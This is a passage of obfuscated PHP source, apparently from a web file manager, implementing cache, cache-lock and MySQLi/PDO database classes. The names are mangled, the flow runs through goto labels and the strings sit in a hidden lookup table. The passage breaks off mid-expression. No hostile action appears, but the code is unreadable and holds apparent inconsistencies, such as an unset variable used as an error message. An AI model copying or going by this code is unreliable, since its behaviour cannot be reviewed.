$GLOBALS[$dÛÕ™ÇõÆ‹[6]][$dÛÕ™ÇõÆ‹[337]]; $CÎ¬‰ŒÀ = $dÖ·”ªÊ®„[$dÖ·”ªÊ®„[$dÛÕ™ÇõÆ‹[756]]]; $d‡¶½‰¯ = $dÖ·”ªÊ®„[$dÛÕ™ÇõÆ‹[757]]; goto eÓ¶¨™Š´; D‡Î¼ÚÄ´: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($cœÚÀƒ÷°) { if (is_array($cœÚÀƒ÷°) || is_object($cœÚÀƒ÷°)) { $cœÚÀƒ÷° = json_encode($cœÚÀƒ÷°); } $cœÚÀƒ÷° = rawurlencode($cœÚÀƒ÷°); return md5(KOD_SITE_ID . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][70] . $cœÚÀƒ÷°); } public static function get($E¬áğ«Ò£½) { $CêîßÌƒäÌ = self::key($E¬áğ«Ò£½); if (!isset(self::$memoryCache[$CêîßÌƒäÌ])) { $B‚‡ƒ­ç×Ä = self::init()->get($CêîßÌƒäÌ); self::$memoryCache[$CêîßÌƒäÌ] = unserialize($B‚‡ƒ­ç×Ä); } return self::$memoryCache[$CêîßÌƒäÌ]; } public static function set($dÜíáŠ‰º¹, $Eø¯ª¿½–Å, $a¼Òƒ®‹ğ = false) { goto fØóã†™ÅŸ; fØóã†™ÅŸ: $F¦øîš‹ÆÄ = self::key($dÜíáŠ‰º¹); if (isset(self::$memoryCache[$F¦øîš‹ÆÄ]) && self::$memoryCache[$F¦øîš‹ÆÄ] === $Eø¯ª¿½–Å) { return !0; } if ($a¼Òƒ®‹ğ === 0) { self::$memoryCache[$F¦øîš‹ÆÄ] = $Eø¯ª¿½–Å; return !0; } goto fåƒ·ğ…¥; fåƒ·ğ…¥: CacheLock::lock($dÜíáŠ‰º¹); $AãŞ´›¥ˆ† = self::init()->set($F¦øîš‹ÆÄ, serialize($Eø¯ª¿½–Å), $a¼Òƒ®‹ğ); self::$memoryCache[$F¦øîš‹ÆÄ] = $Eø¯ª¿½–Å; goto A´Ôæ§ÅÓ; A´Ôæ§ÅÓ: CacheLock::unlock($dÜíáŠ‰º¹); return $AãŞ´›¥ˆ†; goto b…ˆİ†¨ô‹; b…ˆİ†¨ô‹: } public static function remove($aÉ± İŞ·Ç) { goto c¢´“Ş¬‘Ä; CÕáˆÚ¯æ: CacheLock::lock($aÉ± İŞ·Ç); $C§†¸¥»îˆ = self::init()->remove($aœâåÈÛ); CacheLock::unlock($aÉ± İŞ·Ç); goto d¹”±ÄÒËµ; d¹”±ÄÒËµ: return $C§†¸¥»îˆ; goto bÛÀ˜ØÌ—ï; c¢´“Ş¬‘Ä: $aœâåÈÛ = self::key($aÉ± İŞ·Ç); unset(self::$memoryCache[$aœâåÈÛ]); self::clearTimeout(); goto CÕáˆÚ¯æ; bÛÀ˜ØÌ—ï: } public static function clearMemory($b£ÊŞİĞİä = false) { if ($b£ÊŞİĞİä) { $b£ÊŞİĞİä = self::key($b£ÊŞİĞİä); unset(self::$memoryCache[$b£ÊŞİĞİä]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][761])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][762])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Aï‡³³îõÅ, $d‡í¬«ê´ä) { $dœ˜Š‹Á“ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->cachePath = $Aï‡³³îõÅ[$dœ˜Š‹Á“[75]]; $this->prefix = $dœ˜Š‹Á“[763]; $this->cacheTime = $d‡í¬«ê´ä; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($Bàƒƒí²ÇÇ) { $c¹‚Ñ™…Œ¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bàƒƒí²ÇÇ = str_replace(array($c¹‚Ñ™…Œ¥[764], $c¹‚Ñ™…Œ¥[93], $c¹‚Ñ™…Œ¥[69]), $c¹‚Ñ™…Œ¥[765], $Bàƒƒí²ÇÇ); return $this->cachePath . $c¹‚Ñ™…Œ¥[766] . $Bàƒƒí²ÇÇ . $c¹‚Ñ™…Œ¥[767]; } public function set($aö‚éÆí„…, $d‘šİí˜…¡, $cõ‡ÄéÔÑù = false) { $EÂÙÛÕÖ¦ = $this->getFile($aö‚éÆí„…); if (file_put_contents($EÂÙÛÕÖ¦, $this->prefix . $d‘šİí˜…¡, LOCK_EX)) { return !0; } @unlink($EÂÙÛÕÖ¦); return !1; } public function get($eÉê²Ú´©) { $AÛ‘¸ÆÃæ = $this->getFile($eÉê²Ú´©); if (file_exists($AÛ‘¸ÆÃæ) && filemtime($AÛ‘¸ÆÃæ) < time() - $this->cacheTime) { @unlink($AÛ‘¸ÆÃæ); return !1; } $eÒÄ ·İ› = @file_get_contents($AÛ‘¸ÆÃæ); return substr($eÒÄ ·İ›, strlen($this->prefix)); } public function remove($cŸ…î§¹•) { $D¡‹¾ ‰Â = $this->getFile($cŸ…î§¹•); return @unlink($D¡‹¾ ‰Â); } public function deleteAll() { $B‡ˆ”™‘©· =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C‰¼Íİ‚Æ = scandir($this->cachePath); foreach ($C‰¼Íİ‚Æ as $Dªß¼ï±¼°) { $d„ø„ñº¯Ä = $this->cachePath . $Dªß¼ï±¼°; if (strpos($d„ø„ñº¯Ä, $B‡ˆ”™‘©·[767]) && strpos($d„ø„ñº¯Ä, $B‡ˆ”™‘©·[768])) { @unlink($d„ø„ñº¯Ä); } } } public function clearTimeout() { $d¾ïÎåŞ½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d¬Ëù‚  = scandir($this->cachePath); foreach ($d¬Ëù‚  as $aĞ¯ç„ªˆ´) { $d´¸«„„‹† = $this->cachePath . $aĞ¯ç„ªˆ´; if (strpos($d´¸«„„‹†, $d¾ïÎåŞ½[767]) && strpos($d´¸«„„‹†, $d¾ïÎåŞ½[768]) && filemtime($d´¸«„„‹†) < time() - $this->cacheTime) { @unlink($d´¸«„„‹†); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto bª‰ÔÓÙùŠ; C¯áŸ‡æË: self::$timeout = $a†—ˆÄ“á[$aÊÔ¸çì¶[769]] ? $a†—ˆÄ“á[$aÊÔ¸çì¶[769]] : 10; $f³±ˆéÖ˜ = _get($GLOBALS[$aÊÔ¸çì¶[6]], $aÊÔ¸çì¶[770]); $dßğ‘†¤ = $a†—ˆÄ“á[$aÊÔ¸çì¶[756]] ? $a†—ˆÄ“á[$aÊÔ¸çì¶[756]] : $aÊÔ¸çì¶[167]; goto EÂìÍ÷¿ñ; bª‰ÔÓÙùŠ: $aÊÔ¸çì¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (self::$handle) { return self::$handle; } $a†—ˆÄ“á = $GLOBALS[$aÊÔ¸çì¶[6]][$aÊÔ¸çì¶[337]]; goto C¯áŸ‡æË; EÂìÍ÷¿ñ: if ($dßğ‘†¤ == $aÊÔ¸çì¶[17] && $f³±ˆéÖ˜ == $aÊÔ¸çì¶[9]) { $dßğ‘†¤ = $aÊÔ¸çì¶[167]; } switch ($dßğ‘†¤) { case $aÊÔ¸çì¶[759]: self::$handle = new CacheLockRedis(); break; case $aÊÔ¸çì¶[760]: self::$handle = new CacheLockMemcached(); break; case $aÊÔ¸çì¶[17]: self::$handle = new CacheLockDatabase(); break; case $aÊÔ¸çì¶[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto e†’¸Ôò‡¾; e†’¸Ôò‡¾: } private static function key($E·„—®öÌ) { return $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][771] . Cache::key($E·„—®öÌ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($aî«šƒË„÷ = '') { self::$errorMsg = $aî«šƒË„÷; } public static function lockGlobal($EÛ™é¸£Œ¡, $c…–éÊÂí°) { return self::lock($EÛ™é¸£Œ¡, $c…–éÊÂí°, !0); } public static function lock($d‚‹Ú–…õ, $Dš‹¡•×È³ = false, $fõŠÇ£Æ•¥ = false) { goto B¡é•æ‚‘Ì; cì†Ä†Œè: $Dš‹¡•×È³ = $Dš‹¡•×È³ ? $Dš‹¡•×È³ : self::$timeout; $bÔî ´® = $F·Êø•µ«->lock($fœ†Ş“ªÀÏ, $Dš‹¡•×È³); if (!$bÔî ´®) { $Bç·¢š¼Ôò = $cÜ×›ğ‘ä©[772] . $Dš‹¡•×È³ . $cÜ×›ğ‘ä©[67] . self::$errorMsg . $cÜ×›ğ‘ä©[67] . get_caller_msg(); $bó­Ù©š¿ = "\114\157\x63\x6b\x20\141\x63\164\151\157\156\72\40{$fœ†Ş“ªÀÏ}\x20\x74\x69\x6d\145\157\165\x74\x2c\x6f\x76\x65\162\40{$Dš‹¡•×È³}\40\x73"; $bó­Ù©š¿ = self::$errorMsg ? self::$errorMsg : $cŒëÃØäÃØ; write_log($Bç·¢š¼Ôò, $cÜ×›ğ‘ä©[773]); show_json($bó­Ù©š¿, !1); } goto dÃ·Ìô‘; B¡é•æ‚‘Ì: $cÜ×›ğ‘ä© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F·Êø•µ« = self::init(); $fœ†Ş“ªÀÏ = self::key($d‚‹Ú–…õ); goto cì†Ä†Œè; dÃ·Ìô‘: if (!$fõŠÇ£Æ•¥) { self::$lockItem[$fœ†Ş“ªÀÏ] = !0; } return $bÔî ´®; goto A©áƒœÉŠÛ; A©áƒœÉŠÛ: } public static function lockGet($dé‰â…ƒ‚) { $a¡ˆÑ»ñÙ­ = self::key($dé‰â…ƒ‚); if (self::$lockItem[$a¡ˆÑ»ñÙ­]) { return self::$lockItem[$a¡ˆÑ»ñÙ­]; } return self::init()->lockGet($a¡ˆÑ»ñÙ­); } public static function unlock($EùÄø›Õ) { $fˆ£è…ÆµŸ = self::key($EùÄø›Õ); self::$lockItem[$fˆ£è…ÆµŸ] = null; return self::init()->unlock($fˆ£è…ÆµŸ); } public static function unlockRuntime() { $BŞî®î¥‰ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cõôõ²²‚Ò = self::init(); $fâ¿–îÀ¨‚ = !1; foreach (self::$lockItem as $bÕÑ»Ë°­ => $EÑ“ØŞœÏš) { if (!$EÑ“ØŞœÏš) { continue; } $cõôõ²²‚Ò->unlock($bÕÑ»Ë°­); if (!$fâ¿–îÀ¨‚) { $fâ¿–îÀ¨‚ = !0; write_log($BŞî®î¥‰ï[774] . $bÕÑ»Ë°­ . $BŞî®î¥‰ï[67] . get_caller_msg(), $BŞî®î¥‰ï[773]); continue; } write_log($BŞî®î¥‰ï[774] . $bÕÑ»Ë°­, $BŞî®î¥‰ï[773]); } } } goto a¡÷¡ª†íÄ; dÜé¼™«¸: class DbMysqli extends Db { public function __construct($dÉÔ·£õ­Ò = '') { $FÂ‘Çò˜ôê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!extension_loaded($FÂ‘Çò˜ôê[728])) { think_exception(think_lang($FÂ‘Çò˜ôê[10]) . $FÂ‘Çò˜ôê[821]); } if (!empty($dÉÔ·£õ­Ò)) { $this->config = $dÉÔ·£õ­Ò; if (empty($this->config[$FÂ‘Çò˜ôê[13]])) { $this->config[$FÂ‘Çò˜ôê[13]] = $FÂ‘Çò˜ôê[33]; } } } public function connect($C‹È‚ä²§ = '', $D±×‚´ = 0) { $dÎË·‘® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($this->linkID[$D±×‚´])) { goto aÊ¦÷åğÔ; d«Ôã£ší½: $C¥¾ÀŞõªÅ = $this->linkID[$D±×‚´]->server_version; $this->linkID[$D±×‚´]->query($dÎË·‘®[799] . think_config($dÎË·‘®[800]) . $dÎË·‘®[55]); if ($C¥¾ÀŞõªÅ > $dÎË·‘®[801]) { $this->linkID[$D±×‚´]->query($dÎË·‘®[802]); } goto d¨ñàÚÓÌÇ; d¨ñàÚÓÌÇ: $this->connected = !0; if (1 != think_config($dÎË·‘®[18])) { unset($this->config); } goto b·Æøøì–¹; aÊ¦÷åğÔ: if (empty($C‹È‚ä²§)) { $C‹È‚ä²§ = $this->config; } $this->linkID[$D±×‚´] = new mysqli($C‹È‚ä²§[$dÎË·‘®[795]], $C‹È‚ä²§[$dÎË·‘®[797]], $C‹È‚ä²§[$dÎË·‘®[798]], $C‹È‚ä²§[$dÎË·‘®[17]], $C‹È‚ä²§[$dÎË·‘®[796]] ? intval($C‹È‚ä²§[$dÎË·‘®[796]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto d«Ôã£ší½; b·Æøøì–¹: } return $this->linkID[$D±×‚´]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($aÅ‚×¼Á†½) { goto dá»­ÕÖª; bƒå‡Üò•: $this->queryStr = $aÅ‚×¼Á†½; if ($this->queryID) { $this->free(); } think_action_status($EéÜÇÒÎ[19], 1); goto F”‰ƒÆá”±; F”‰ƒÆá”±: think_status($EéÜÇÒÎ[20]); $this->queryID = $this->_linkID->query($aÅ‚×¼Á†½); if ($this->_linkID->more_results()) { while (($CÙ‰”ß»ÍĞ = $this->_linkID->next_result()) != NULL) { $CÙ‰”ß»ÍĞ->free_result(); } } goto B÷²ÆøËù¼; B÷²ÆøËù¼: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Fß“‘˜Ã; dá»­ÕÖª: $EéÜÇÒÎ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bƒå‡Üò•; Fß“‘˜Ã: } public function execute($Eì‹ßæÁ¿–) { goto f½Á©ÖÅâò; eæÓîŒ°Ì: if (!1 === $aªõ±‚‘‹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto D¯º•£¥âÇ; EÉğ÷ñ«Å†: think_status($bç¡‰à®ßõ[20]); $aªõ±‚‘‹ = $this->_linkID->query($Eì‹ßæÁ¿–); $this->debug(); goto eæÓîŒ°Ì; BäÓÛô†ô½: $this->queryStr = $Eì‹ßæÁ¿–; if ($this->queryID) { $this->free(); } think_action_status($bç¡‰à®ßõ[21], 1); goto EÉğ÷ñ«Å†; f½Á©ÖÅâò: $bç¡‰à®ßõ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BäÓÛô†ô½; D¯º•£¥âÇ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d°½¶ ¶Ûò = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$d°½¶ ¶Ûò) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eô‘âÉåÕ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Eô‘âÉåÕ) { $this->error(); return !1; } } return !0; } private function getAll() { $aù®‹±ƒÍ× = array(); if ($this->numRows > 0) { for ($b©Ü­¯¥Ê = 0; $b©Ü­¯¥Ê < $this->numRows; $b©Ü­¯¥Ê++) { $aù®‹±ƒÍ×[$b©Ü­¯¥Ê] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $aù®‹±ƒÍ×; } public function getFields($c‹Ë‚ùÆ¡Ï) { $Dçˆ‡Ãò¢ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A—ášÎ›…Í = $this->query($Dçˆ‡Ãò¢[806] . $this->parseKey($c‹Ë‚ùÆ¡Ï)); $Bªß¸ñ–„Ê = array(); if ($A—ášÎ›…Í) { foreach ($A—ášÎ›…Í as $cÇ¦¤ô®ñ => $F‘ãØ¨Ş£ö) { $Bªß¸ñ–„Ê[$F‘ãØ¨Ş£ö[$Dçˆ‡Ãò¢[27]]] = array($Dçˆ‡Ãò¢[28] => $F‘ãØ¨Ş£ö[$Dçˆ‡Ãò¢[27]], $Dçˆ‡Ãò¢[29] => $F‘ãØ¨Ş£ö[$Dçˆ‡Ãò¢[30]], $Dçˆ‡Ãò¢[31] => (bool) ($F‘ãØ¨Ş£ö[$Dçˆ‡Ãò¢[32]] === $Dçˆ‡Ãò¢[33]), $Dçˆ‡Ãò¢[34] => $F‘ãØ¨Ş£ö[$Dçˆ‡Ãò¢[35]], $Dçˆ‡Ãò¢[36] => strtolower($F‘ãØ¨Ş£ö[$Dçˆ‡Ãò¢[37]]) == $Dçˆ‡Ãò¢[38], $Dçˆ‡Ãò¢[39] => strtolower($F‘ãØ¨Ş£ö[$Dçˆ‡Ãò¢[40]]) == $Dçˆ‡Ãò¢[41]); } } return $Bªß¸ñ–„Ê; } public function getTables($E¦ƒØ—†ª… = '') { $CÇ…Ø³â =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Cš…é­ØÚÚ = !empty($E¦ƒØ—†ª…) ? $CÇ…Ø³â[808] . $E¦ƒØ—†ª… : $CÇ…Ø³â[809]; $b±À“÷‡·î = $this->query($Cš…é­ØÚÚ); $eÂåİ‡Šù = array(); if ($b±À“÷‡·î) { foreach ($b±À“÷‡·î as $A¡âãöğÅ¦ => $B©È³³Ï¶á) { $eÂåİ‡Šù[$A¡âãöğÅ¦] = current($B©È³³Ï¶á); } } return $eÂåİ‡Šù; } public function replace($FÔŞ…ÓÌÁ°, $Eß·‡Ş¶Ş· = array()) { $Dô‰éŒ½Õ• =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; foreach ($FÔŞ…ÓÌÁ° as $E¶¦öÖ => $aÇ—Û›‘‹²) { $dŸ‰³ŒçÔÇ = $this->parseValue($aÇ—Û›‘‹²); if (is_scalar($dŸ‰³ŒçÔÇ)) { $b¨‹Ñ®‹åÖ[] = $dŸ‰³ŒçÔÇ; $e¶®œÄ§–´[] = $this->parseKey($E¶¦öÖ); } } $då›Œ‘¬®Ï = $Dô‰éŒ½Õ•[810] . $this->parseTable($Eß·‡Ş¶Ş·[$Dô‰éŒ½Õ•[267]]) . $Dô‰éŒ½Õ•[811] . implode($Dô‰éŒ½Õ•[47], $e¶®œÄ§–´) . $Dô‰éŒ½Õ•[812] . implode($Dô‰éŒ½Õ•[47], $b¨‹Ñ®‹åÖ) . $Dô‰éŒ½Õ•[813]; return $this->execute($då›Œ‘¬®Ï); } public function insertAll($aåº³á÷Œ¿, $d †¾Šª = array(), $F­¾¿âË¤§ = false) { goto a¨ƒĞ©ÁĞ; Bßóï¶¶å: $BØ½´Ú•¾‹ = ($F­¾¿âË¤§ ? $fÓ¥õ®Š­‘[815] : $fÓ¥õ®Š­‘[816]) . $fÓ¥õ®Š­‘[817] . $this->parseTable($d †¾Šª[$fÓ¥õ®Š­‘[267]]) . $fÓ¥õ®Š­‘[811] . implode($fÓ¥õ®Š­‘[47], $e°™Ö«‡) . $fÓ¥õ®Š­‘[818] . implode($fÓ¥õ®Š­‘[47], $d¾ˆ…›æ„); return $this->execute($BØ½´Ú•¾‹); goto bË±°ÁàÙ“; a¨ƒĞ©ÁĞ: $fÓ¥õ®Š­‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!is_array($aåº³á÷Œ¿[0])) { return !1; } $e°™Ö«‡ = array_keys($aåº³á÷Œ¿[0]); goto e¦ƒšÇŠ·; e¦ƒšÇŠ·: $d¾ˆ…›æ„ = array(); foreach ($aåº³á÷Œ¿ as $a‘‹ŸšÛÓÛ) { $cœõ©çË = array(); foreach ($a‘‹ŸšÛÓÛ as $bÎÅ…Ã¬“ => $có£åˆ‡Ù) { $có£åˆ‡Ù = $this->parseValue($có£åˆ‡Ù); if (is_scalar($có£åˆ‡Ù)) { $cœõ©çË[] = $có£åˆ‡Ù; } } $d¾ˆ…›æ„[] = $fÓ¥õ®Š­‘[248] . implode($fÓ¥õ®Š­‘[47], $cœõ©çË) . $fÓ¥õ®Š­‘[813]; } array_walk($e°™Ö«‡, array($this, $fÓ¥õ®Š­‘[814])); goto Bßóï¶¶å; bË±°ÁàÙ“: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eŒ¥ÒÏ„‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->error = $this->_linkID->errno . $eŒ¥ÒÏ„‰[4] . $this->_linkID->error; if ($eŒ¥ÒÏ„‰[33] != $this->queryStr) { $this->error .= LNG($eŒ¥ÒÏ„‰[45]) . $this->queryStr; } think_trace($this->error, $eŒ¥ÒÏ„‰[33], $eŒ¥ÒÏ„‰[46]); return $this->error; } public function escapeString($EÄÖíéŒÙ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($EÄÖíéŒÙ); } else { return addslashes($EÄÖíéŒÙ); } } public function parseKey(&$cšİò®ÌÙñ, $B±éº‘Ë‘Ä = true) { $d§‘§Ê· ¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($B±éº‘Ë‘Ä) { $cšİò®ÌÙñ = $this->parseKeyCheck($cšİò®ÌÙñ); } if ($cšİò®ÌÙñ != $d§‘§Ê· ¡[176] && !preg_match($d§‘§Ê· ¡[819], $cšİò®ÌÙñ)) { $cšİò®ÌÙñ = $d§‘§Ê· ¡[820] . trim($cšİò®ÌÙñ, $d§‘§Ê· ¡[820]) . $d§‘§Ê· ¡[820]; } return $cšİò®ÌÙñ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($dÂŸ¾ÀÔÖ¹ = '') { $Cº¾‰ùîÜŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!class_exists($Cº¾‰ùîÜŒ[822])) { think_exception(think_lang($Cº¾‰ùîÜŒ[10]) . $Cº¾‰ùîÜŒ[823]); } if (!empty($dÂŸ¾ÀÔÖ¹)) { $this->config = $dÂŸ¾ÀÔÖ¹; if (empty($this->config[$Cº¾‰ùîÜŒ[13]])) { $this->config[$Cº¾‰ùîÜŒ[13]] = array(); } } } public function connect($F÷†İ•‘Ó = '', $A¥¼²›òĞ = 0) { $b‡ˆ÷éî² =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($this->linkID[$A¥¼²›òĞ])) { goto DÛ¡å»Õ½µ; DÛ¡å»Õ½µ: if (empty($F÷†İ•‘Ó)) { $F÷†İ•‘Ó = $this->config; } if ($this->pconnect) { $F÷†İ•‘Ó[$b‡ˆ÷éî²[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$A¥¼²›òĞ] = new PDO($F÷†İ•‘Ó[$b‡ˆ÷éî²[824]], $F÷†İ•‘Ó[$b‡ˆ÷éî²[797]], $F÷†İ•‘Ó[$b‡ˆ÷éî²[798]], $F÷†İ•‘Ó[$b‡ˆ÷éî²[13]]); } catch (PDOException $cí…î›‡à™) { think_exception($cí…î›‡à™->getMessage()); } goto f×˜ˆÓ÷Ôá; E„Ç “æïô: try { $this->linkID[$A¥¼²›òĞ]->exec($b‡ˆ÷éî²[833] . think_config($b‡ˆ÷éî²[800])); } catch (Exception $cí…î›‡à™) { } $this->connected = !0; if (1 != think_config($b‡ˆ÷éî²[18])) { unset($this->config); } goto Eè×ŒÍ—ÈÃ; f×˜ˆÓ÷Ôá: $this->dbType = $this->_getDsnType($F÷†İ•‘Ó[$b‡ˆ÷éî²[824]]); if (in_array($this->dbType, array($b‡ˆ÷éî²[825], $b‡ˆ÷éî²[826], $b‡ˆ÷éî²[827], $b‡ˆ÷éî²[828]))) { think_exception($b‡ˆ÷éî²[829] . $this->dbType . $b‡ˆ÷éî²[830] . $this->dbType . $b‡ˆ÷éî²[831]); } if (!$this->linkID[$A¥¼²›òĞ]) { think_exception($b‡ˆ÷éî²[832]); } goto E„Ç “æïô; Eè×ŒÍ—ÈÃ: } return $this->linkID[$A¥¼²›òĞ]; } public function free() { $this->PDOStatement = null; } public function query($EÆ½‚Üàˆå, $B¹óŒ”ßÀ = array()) { goto a†ÁÕÖø¾ ; C¼™Î†ììÕ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $A™Ï¸‹ã›¥ = $this->PDOStatement->execute($B¹óŒ”ßÀ); $this->debug(); goto Aí‹¿ƒÉƒ˜; f‰¤£­†Ÿ: think_action_status($b ÅÏ¾‘[19], 1); think_status($b ÅÏ¾‘[20]); $this->PDOStatement = $this->_linkID->prepare($EÆ½‚Üàˆå); goto C¼™Î†ììÕ; Aí‹¿ƒÉƒ˜: if (!1 === $A™Ï¸‹ã›¥) { $this->error(); return !1; } else { return $this->getAll(); } goto a“›î¬Ã¼ì; C¿Í®ÔÁ¶ò: $this->queryStr = $EÆ½‚Üàˆå; if (!empty($B¹óŒ”ßÀ)) { $this->queryStr .= $b ÅÏ¾‘[834] . print_r($B¹óŒ”ßÀ, !0) . $b ÅÏ¾‘[835]; } if (!empty($this->PDOStatement)) { $this->free(); } goto f‰¤£­†Ÿ; a†ÁÕÖø¾ : $b ÅÏ¾‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C¿Í®ÔÁ¶ò; a“›î¬Ã¼ì: } public function execute($a‚¾Ü… ¥Ú, $aÍîÚ¶îôß = array()) { goto d¤”¨À’¼î; dåàÀøòï: if ($this->dbType == $d¥èÓİ³¥å[828]) { if (preg_match($d¥èÓİ³¥å[836], $this->queryStr, $b› àØ¸¶ƒ)) { $this->table = think_config($d¥èÓİ³¥å[837]) . str_ireplace(think_config($d¥èÓİ³¥å[838]), $d¥èÓİ³¥å[361], $b› àØ¸¶ƒ[2]); $f®êŠï÷í = (bool) $this->query($d¥èÓİ³¥å[839] . strtoupper($this->table) . $d¥èÓİ³¥å[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($d¥èÓİ³¥å[21], 1); goto eŸ§ã•Â¦¦; Bæ—¯…ˆò: $fğ¿§Ê… = $this->PDOStatement->execute($aÍîÚ¶îôß); $this->debug(); if (!1 === $fğ¿§Ê…) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($f®êŠï÷í || preg_match($d¥èÓİ³¥å[840], $a‚¾Ü… ¥Ú)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto B‘ìçÑ ¸Ó; d¤”¨À’¼î: $d¥èÓİ³¥å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÌÇ‡„÷õ¶; eŸ§ã•Â¦¦: think_status($d¥èÓİ³¥å[20]); $this->PDOStatement = $this->_linkID->prepare($a‚¾Ü… ¥Ú); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto Bæ—¯…ˆò; FÌÇ‡„÷õ¶: $this->queryStr = $a‚¾Ü… ¥Ú; if (!empty($aÍîÚ¶îôß)) { $this->queryStr .= $d¥èÓİ³¥å[834] . print_r($aÍîÚ¶îôß, !0) . $d¥èÓİ³¥å[835]; } $f®êŠï÷í = !1; goto dåàÀøòï; B‘ìçÑ ¸Ó: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bëô®’æõÜ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Bëô®’æõÜ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $cÇ“´ÁÉÎ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$cÇ“´ÁÉÎ) { $this->error(); return !1; } } return !0; } private function getAll() { $FÌÁÙÓŠÏ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($FÌÁÙÓŠÏ); return $FÌÁÙÓŠÏ; } public function getFields($bÏ¸ºˆò™) { goto dö¬ÖÜ‚‚ó; A´ª´éã: $DÔ¨·è…Ğ = $this->query($C†Ôœ·Ğ›Ñ); $f“êË¨™ô‡ = array(); if ($DÔ¨·è…Ğ) { foreach ($DÔ¨·è…Ğ as $Dğ²İìÔ‚ä => $Aö²±Çò×) { $Aö²±Çò× = array_change_key_case($Aö²±Çò×); $Aö²±Çò×[$bŠ…œˆ‘’ë[28]] = isset($Aö²±Çò×[$bŠ…œˆ‘’ë[28]]) ? $Aö²±Çò×[$bŠ…œˆ‘’ë[28]] : $bŠ…œˆ‘’ë[361]; $Aö²±Çò×[$bŠ…œˆ‘’ë[29]] = isset($Aö²±Çò×[$bŠ…œˆ‘’ë[29]]) ? $Aö²±Çò×[$bŠ…œˆ‘’ë[29]] : $bŠ…œˆ‘’ë[361]; $cçéé˜Èæğ = isset($Aö²±Çò×[$bŠ…œˆ‘’ë[261]]) ? $Aö²±Çò×[$bŠ…œˆ‘’ë[261]] : $Aö²±Çò×[$bŠ…œˆ‘’ë[28]]; $f“êË¨™ô‡[$cçéé˜Èæğ] = array($bŠ…œˆ‘’ë[28] => $cçéé˜Èæğ, $bŠ…œˆ‘’ë[29] => $Aö²±Çò×[$bŠ…œˆ‘’ë[29]], $bŠ…œˆ‘’ë[31] => (bool) (isset($Aö²±Çò×[$bŠ…œˆ‘’ë[99]]) && $Aö²±Çò×[$bŠ…œˆ‘’ë[99]] === 